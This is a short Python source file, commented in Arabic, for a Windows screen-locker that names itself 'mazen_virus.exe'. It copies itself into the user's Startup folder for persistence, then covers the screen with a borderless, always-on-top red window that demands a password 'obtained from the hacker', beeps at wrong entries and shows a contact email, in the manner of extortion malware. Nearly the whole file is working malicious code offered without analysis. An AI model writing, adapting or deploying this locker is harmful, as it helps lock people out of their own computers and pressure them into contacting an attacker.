import tkinter as tk
from tkinter import messagebox
import winsound
import threading
import os
import sys
import shutil

# الحصول على المسار الكامل للتطبيق الحالي
path_app = os.path.abspath(sys.argv[0])

# تحديد مسار مجلد Startup
startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
# تحديد اسم الملف في مجلد Startup
startup_file = os.path.join(startup_path, "mazen_virus.exe")

# التحقق من وجود الملف ونسخه إذا لم يكن موجودًا
if not os.path.exists(startup_file):
    try:
        shutil.copy(path_app, startup_file)
    except Exception as e:
        print(f"Failed to copy file to startup: {e}")

# إنشاء النافذة الرئيسية
root = tk.Tk()

# دالة الخروج من التطبيق
def exit_app():
    root.destroy()

# دالة التحقق من كلمة المرور
def check_password():
    key = "D3FAULT2012@@"
    if entry.get() == key:
        messagebox.showinfo("Success", "Password is correct!")
        exit_app()
    else:
        # تشغيل صوت تنبيه
        winsound.Beep(1000, 500)  # تم تقليل مدة الصوت إلى 0.5 ثانية
        messagebox.showerror("don't play with me", "If you need the password, connect with me")

# إعدادات النافذة
root.geometry(f"{root.winfo_screenwidth()}x{root.winfo_screenheight()}")
root.overrideredirect(True)
root.attributes("-topmost", True)
root.config(background="red")
root.title("Enter the password")

# واجهة المستخدم
tk.Label(root, text="Enter the password you obtained from the hacker", bg="red", fg="white", font=("Arial", 14)).pack(pady=20)
entry = tk.Entry(root, width=50, bd=0, font=("Arial", 12))
entry.pack(pady=5)
b = tk.Button(root, text="enter to your device", command=check_password, font=("Arial", 12))
b.pack(pady=10)
tk.Label(root, text="d3fualt01@gmail.com", bg="red", fg="white", font=("Arial", 10)).place(x=450, y=600)

# منع تغيير حجم النافذة
root.resizable(False, False)


root.mainloop()